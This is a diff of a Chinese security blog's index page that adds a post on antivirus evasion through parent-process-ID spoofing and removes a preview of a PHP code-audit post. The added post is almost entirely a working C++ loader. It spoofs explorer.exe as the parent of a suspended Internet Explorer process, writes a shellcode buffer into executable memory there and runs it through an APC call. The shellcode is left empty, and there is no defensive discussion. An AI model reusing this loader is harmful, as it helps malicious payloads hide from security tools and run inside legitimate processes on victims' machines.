@@ -197,7 +197,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">22</span>
+          <span class="site-state-item-count">23</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -248,6 +248,86 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://tingqiao.github.io/posts/59933917/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="听桥">
+      <meta itemprop="description" content="听桥的博客">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="TingQiao's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/posts/59933917/" class="post-title-link" itemprop="url">免杀-PPID Spoofing</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2020-12-28 13:24:41 / 修改时间：13:30:53" itemprop="dateCreated datePublished" datetime="2020-12-28T13:24:41+08:00">2020-12-28</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">内网渗透</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/" itemprop="url" rel="index"><span itemprop="name">免杀</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="免杀-PPID-Spoofing"><a href="#免杀-PPID-Spoofing" class="headerlink" title="免杀-PPID Spoofing"></a>免杀-PPID Spoofing</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function">DWORD <span class="title">getParentProcessID</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">    PROCESSENTRY32 process = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    process.dwSize = <span class="keyword">sizeof</span>(process);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (Process32First(snapshot, &amp;process)) &#123;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">                    <span class="comment">//If you want to another process as parent change here</span></span><br><span class="line">            <span class="keyword">if</span> (!wcscmp(process.szExeFile, <span class="string">L&quot;explorer.exe&quot;</span>))</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span> (Process32Next(snapshot, &amp;process));</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    CloseHandle(snapshot);</span><br><span class="line">    <span class="keyword">return</span> process.th32ProcessID;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> shellCode[] = <span class="string">&quot;&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    STARTUPINFOEXA sInfoEX;</span><br><span class="line">    PROCESS_INFORMATION pInfo;</span><br><span class="line">    SIZE_T sizeT;</span><br><span class="line"> </span><br><span class="line">    HANDLE expHandle = OpenProcess(PROCESS_ALL_ACCESS, <span class="literal">false</span>, getParentProcessID());</span><br><span class="line"> </span><br><span class="line">    ZeroMemory(&amp;sInfoEX, <span class="keyword">sizeof</span>(STARTUPINFOEXA));</span><br><span class="line">    InitializeProcThreadAttributeList(<span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>, &amp;sizeT);</span><br><span class="line">    sInfoEX.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), <span class="number">0</span>, sizeT);</span><br><span class="line">    InitializeProcThreadAttributeList(sInfoEX.lpAttributeList, <span class="number">1</span>, <span class="number">0</span>, &amp;sizeT);</span><br><span class="line">    UpdateProcThreadAttribute(sInfoEX.lpAttributeList, <span class="number">0</span>, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &amp;expHandle, <span class="keyword">sizeof</span>(HANDLE), <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    sInfoEX.StartupInfo.cb = <span class="keyword">sizeof</span>(STARTUPINFOEXA);</span><br><span class="line"> </span><br><span class="line">    CreateProcessA(<span class="string">&quot;C:\\Program Files\\internet explorer\\iexplore.exe&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="keyword">reinterpret_cast</span>&lt;LPSTARTUPINFOA&gt;(&amp;sInfoEX), &amp;pInfo);</span><br><span class="line"> </span><br><span class="line">    LPVOID lpBaseAddress = (LPVOID)VirtualAllocEx(pInfo.hProcess, <span class="literal">NULL</span>, <span class="number">0x1000</span>, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    SIZE_T *lpNumberOfBytesWritten = <span class="number">0</span>;</span><br><span class="line">    BOOL resWPM = WriteProcessMemory(pInfo.hProcess, lpBaseAddress, (LPVOID)shellCode, <span class="keyword">sizeof</span>(shellCode), lpNumberOfBytesWritten);</span><br><span class="line"> </span><br><span class="line">    QueueUserAPC((PAPCFUNC)lpBaseAddress, pInfo.hThread, <span class="literal">NULL</span>);</span><br><span class="line">    ResumeThread(pInfo.hThread);</span><br><span class="line">    CloseHandle(pInfo.hThread);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p><img src="/posts/59933917/res/2020-12-28-13-27-01.png" alt="1"></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://tingqiao.github.io/posts/95ea92bf/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -273,7 +353,7 @@
       <span class="post-meta-item-text">发表于</span>
       
 
-      <time title="创建时间：2020-12-26 15:41:38 / 修改时间：16:02:35" itemprop="dateCreated datePublished" datetime="2020-12-26T15:41:38+08:00">2020-12-26</time>
+      <time title="创建时间：2020-12-26 15:41:38 / 修改时间：16:38:48" itemprop="dateCreated datePublished" datetime="2020-12-26T15:41:38+08:00">2020-12-26</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -1025,102 +1105,6 @@
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/posts/539da8ed/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://tingqiao.github.io/posts/3e24b757/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="听桥">
-      <meta itemprop="description" content="听桥的博客">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="TingQiao's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/posts/3e24b757/" class="post-title-link" itemprop="url">PHP代码审计-PHP基础（持续ing...）</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2020-12-13 23:11:33" itemprop="dateCreated datePublished" datetime="2020-12-13T23:11:33+08:00">2020-12-13</time>
-    </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2020-12-23 15:53:16" itemprop="dateModified" datetime="2020-12-23T15:53:16+08:00">2020-12-23</time>
-      </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a>
-        </span>
-          ，
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index"><span itemprop="name">代码审计</span></a>
-        </span>
-          ，
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/php/" itemprop="url" rel="index"><span itemprop="name">php</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="PHP代码审计-PHP基础-ing…"><a href="#PHP代码审计-PHP基础-ing…" class="headerlink" title="PHP代码审计-PHP基础(ing…)"></a>PHP代码审计-PHP基础(ing…)</h2><h3 id="预定义变量"><a href="#预定义变量" class="headerlink" title="预定义变量"></a>预定义变量</h3><h4 id="GET"><a href="#GET" class="headerlink" title="$_GET"></a>$_GET</h4><p>$_GET</p>
-<p>通过 URL 参数（又叫 query string）传递给当前脚本的变量的数组。 注意：该数组不仅仅对 method 为 GET 的请求生效，而是会针对所有带 query string 的请求。</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/posts/3e24b757/#more" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
